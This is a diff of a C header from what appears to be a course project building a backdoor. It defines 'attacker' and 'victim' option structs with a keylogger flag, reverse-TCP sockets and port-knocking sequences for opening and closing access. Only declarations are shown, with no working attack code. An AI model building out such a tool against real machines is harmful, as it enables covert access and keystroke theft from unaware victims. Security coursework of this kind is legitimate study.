@@ -17,6 +17,11 @@
 #define OUTPUT_SIZE 20000
 
 
+
+#define OPEN_ATF "15001 15002 15003"
+#define CLOSE_ATF "15003 15002 15001"
+
+
 struct options_attacker {
     char dest_ip[INET_ADDRSTRLEN];
     char my_ip[INET_ADDRSTRLEN];
@@ -26,17 +31,17 @@ struct options_attacker {
     int udp_socket;
     struct sockaddr_in udpsa;
     struct sockaddr_in tcpsa;
-    char file_info[S_ARR_SIZE];
     char file_name[S_ARR_SIZE];
     int file_size;
     char* data;
     int size;
     bool file_flag;
+    bool target;
+    bool quit;
 
     int rtcp_socket;
     struct sockaddr_in rtcpsa;
     struct sockaddr_in mtcpsa;
-
 };
 
 
@@ -55,10 +60,11 @@ struct options_victim {
     bool keylogger;
     bool target;
 
+    bool rtcp;
     int rtcp_socket;
-    int atcp_socket;
+    int client_count;
+    int atcp_socket[1];
     struct sockaddr_in rtcpsa;
-    struct sockaddr_in ctcpsa;
 };
 
 #endif //COMP8505_PROJECT_OPTIONS_H
